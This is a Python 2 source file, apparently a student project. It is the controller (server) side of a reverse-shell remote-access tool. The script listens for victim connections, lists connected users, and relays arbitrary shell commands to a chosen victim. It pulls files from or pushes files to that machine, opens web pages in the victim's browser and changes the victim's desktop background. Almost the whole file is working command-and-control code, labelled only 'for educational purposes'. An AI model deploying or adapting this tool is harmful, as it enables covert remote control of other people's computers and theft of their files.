#!/usr/bin/env python
# -*- coding: utf-8 -*-

#title           : Reverse Shell over TCP
#description     : Script executing reverse shell connection over tcp sockets
#author          : BADDOU SALAH EDDINE (From Ensa Marrakech)
#python_version  : 2.7.x
#Usage           : ./server.py
#This is for educational purposes only ;)

import socket 
import os      
import threading
import subprocess
import hashlib
import socket
import random


class ClientThread(threading.Thread):

    def __init__(self, sockett,socks,adds,users):
        threading.Thread.__init__(self)
        self.sockett = sockett
        self.socks = socks
        self.adds = adds
        self.users = users
        

    def run(self):
		clientsock, addr = self.sockett.accept()
		username = clientsock.recv(1024)
		self.socks.append(clientsock)
		self.adds.append(addr)
		self.users.append(username)


def download(conn,command):

	x,src,dst = map(str,command.split(' '))
	conn.send(command)
	f = open(dst,'wb') 
	bits = conn.recv(1024)
	while bits != '': 
		if 'Unable to find out the file' in bits:
			print '[-] Unable to find out the file'
			break
		if not bits.endswith('DONE'):
			f.write(bits)
		
		if bits.endswith('DONE'):
			bits=bits.replace('DONE','')
			f.write(bits)
			f.close()
			break
		bits=conn.recv(1024)

	md5_sv = hashlib.md5(open(dst,'rb').read()).hexdigest()	
	conn.send(md5_sv)
	if conn.recv(1024) == 'md5 OK':
		print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
	else :
		print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
	
	
        
    
def upload(conn, command):


	x, src, dst = map(str, command.split(' '))
	conn.send(command)
	file_to_send = open(src,'rb')
	packet = file_to_send.read(1024)
	while packet != '':
		conn.send(packet) 
		packet = file_to_send.read(1024)
	conn.send('DONE')
	file_to_send.close()
	md5_sv = hashlib.md5(open(src,'rb').read()).hexdigest()
	conn.send(md5_sv)
	print md5_sv
	if conn.recv(1024) == 'md5 OK':
		print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
	else :
		print '[-] MD5 Checksum not Verified !'


def _help():


	subprocess.call('clear',shell=True)
	print 'To see the manual of each command type help(command) ex:help(download) , to exit this menu type exit\n' 
	
	while True:
		help_command = str(raw_input('Help)'))
		if help_command == 'exit':
			break
		elif help_command == 'help(terminate)':
			print 'terminate ends the session'
		elif help_command == 'help(download)':
			print 'download => downloads a file from the client machine ex: download #source #dest'
		elif help_command == 'help(upload)':
			print 'upload => uploads a file to the client machine ex: upload #source #dest'
		elif help_command == 'help(username)':
			print 'username => returns the username of the client session'
		elif help_command ==' help(browse)':
			print 'browse => launches a web page in the client browser ex: browse www.google.com'
		elif help_command == 'help(change_desktop_bg)':
			print 'change_desktop_bg => changes the desktop background of the client ex : change_desktop_bg #path_of_image'
	return

def _list():

	print '\nAvailable commands:'
	print '\nupload\ndownload\nclear\nhelp\nchange_desktop_bg\nbrowse\n'	




def connect():
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = 8084
        s.bind(('127.0.0.1', port))
        s.listen(100)
        print '[+] Listening for incoming TCP connection on port ',port
        threads = []
        socks = []
        users = []
        adds = []
        halt = False
        index = -999
        for i in range(10):
            newthread = ClientThread(s,socks,adds,users)
            newthread.start()
            threads.append(newthread)

        print 'To go to the menu of the manual of commands type <<help>> \n'
        print 'To list the available commands type <<?>>\n'
        print 'To see connected users type <<who>>'
        while True :   
               	command=raw_input(">")	
               	if halt :
                    for t in threads:
               	        t.join()
               	    break
               	elif command == 'who':
               		if len(adds) == 0:
               			print '[-] Nobody is connected yet'
               		else :
               			for i in range(len(adds)):
               				print 'Index : ',i,'| Address : ',adds[i][0],' | Username : ',users[i]
           
               	elif 'select' in command:
               		index = command.split(' ')[-1]
               		index = int(index)		
               	
                elif 'terminate' in command:
                        halt = True
                        break
                        socks[index].send('terminate')
                        conn.close() 
                        break
                elif 'download' in command: 
                        download(socks[index],command)
                elif 'upload' in command:
                        upload(socks[index],command)
                elif 'browse' in command:
                        socks[index].send(command)
                        pass	
                elif 'change_desktop_bg' in command:
                        socks[index].send(command)
                        pass
                elif 'clear' in command:
                		subprocess.call('clear',shell=True)
                		pass
                elif command == 'help':
                		_help()
                elif command == '?':
                		_list()
                elif command == '':
                		pass
                else :	
                        socks[index].send(command)
                        print socks[index].recv(2048)
                  

def main ():

	subprocess.call('clear',shell=True)

	connect()

main()
